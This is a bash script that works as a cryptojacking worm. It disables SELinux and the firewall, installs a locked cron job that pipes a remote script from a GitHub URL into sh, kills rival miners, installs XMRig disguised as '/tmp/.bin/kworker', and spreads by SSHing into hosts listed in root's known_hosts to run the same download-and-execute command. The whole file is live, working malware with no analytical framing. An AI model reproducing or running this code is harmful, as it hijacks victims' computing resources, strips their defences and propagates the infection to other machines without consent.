#! /bin/bash


set_envirment(){

    setenforce 0 2>/dev/null
    ufw disable
    iptables -F

    apt-get install curl -y && yum install curl -y && apk add curl -y
    apt-get install wget -y && yum install wget -y && apk add wget -y
    apt-get install cron -y && yum install crontabs -y && apk add cron -y
    
    echo "*/6 * * * (curl -fsSL https://raw.githubusercontent.com/Pamentierx/xmr/main/auto.sh || wget -q -O- https://raw.githubusercontent.com/Pamentierx/xmr/main/auto.sh)|sh" | crontab -    
    chattr -R +i /var/spool/cron
    chattr +i /etc/crontab  
}

set_envirment


kill_other(){

    netstat -antp | grep '119.28.4.91'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
    netstat -antp | grep '101.32.73.178'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
    netstat -antp | grep 185.238.250.137 | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep tmate | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep kinsing | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep kdevtmpfsi | awk '{print $7}' | awk  -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep pythonww | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep tcpp | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep c3pool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep xmr | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep f2pool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep crypto-pool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep t00ls | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep vihansoft | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep mrbpool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    ps aux | grep -a -E "kdevtmpfsi|kinsing|solr|f2pool|tcpp|xmr|tmate|185.238.250.137|c3pool" | awk '{print $2}' | xargs kill -9

} 

kill_other



if [ "$(pgrep -f /tmp/.bin/kworker|wc -l)" -ne 0 ]; then
exit
fi


install(){
    cd /tmp && mkdir -p .bin && cd .bin 
    wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz || wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz   && tar  -zxvf xmrig-6.12.1-linux-x64.tar.gz 
    cd xmrig-6.12.1 && cp xmrig /tmp/.bin/kworker && cd /tmp/.bin  && chmod +x kworker
    wget https://raw.githubusercontent.com/Pamentierx/xmr/main/config.json
    setsid /tmp/.bin/kworker
    rm -rf /tmp/.bin/xmrig-6.12.1
}

install


exploit(){
  if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
    for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); 
    do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL https://raw.githubusercontent.com/Pamentierx/xmr/main/auto.sh || wget -q -O- https://raw.githubusercontent.com/Pamentierx/xmr/main/auto.sh)|sh >/dev/null 2>&1 &' & done
  fi
}

exploit
